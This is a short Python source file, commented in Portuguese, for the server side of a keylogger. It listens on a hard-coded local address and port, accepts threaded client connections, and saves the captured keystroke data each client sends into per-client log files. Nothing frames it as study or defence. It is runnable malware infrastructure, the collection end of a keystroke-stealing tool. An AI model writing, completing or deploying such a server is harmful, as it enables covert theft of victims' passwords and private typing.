import threading
from datetime import date
from socket import *

class KeyloggerServer():

    def __init__(self, host: str, port: int):
        self.socket = socket(AF_INET, SOCK_STREAM)
        self.socket.bind((host, port))
        self.host = host
        self.port = port

    def connection(self, conn, addr):
        print(f'NOVO CLIENTE -> {addr} (Conectado)')
        arquivo = open(f"logs/logs_cliente_{addr[0]}_{date.today().strftime("%d_%m_%Y_")}.txt", "w")
        arquivo.write(f'NOVO CLIENTE -> {addr} (Conectado)')
        while True:
            try:
                msg = conn.recv(1024).decode('utf-8')
            except:
                msg = ' '
            print(msg)
            arquivo.write(msg)
            if not msg:
                print(F"Conexao com {addr} fechada!")
                conn.close()
                arquivo.close()
                break

    def run(self):

        print('-' * 35)
        print('[SERVIDOR KEYLOGGER RODANDO ...]')
        print(f'Enderecao: {self.host}:{self.port}')
        print('-' * 35)
        print(f'Historico de conexões:')

        while True:
            self.socket.listen()
            conn, addr = self.socket.accept()
            thread = threading.Thread(target=self.connection, args=(conn, addr))
            thread.start()

if __name__ == '__main__':
    server = KeyloggerServer('192.168.18.163', 5555)
    server.run()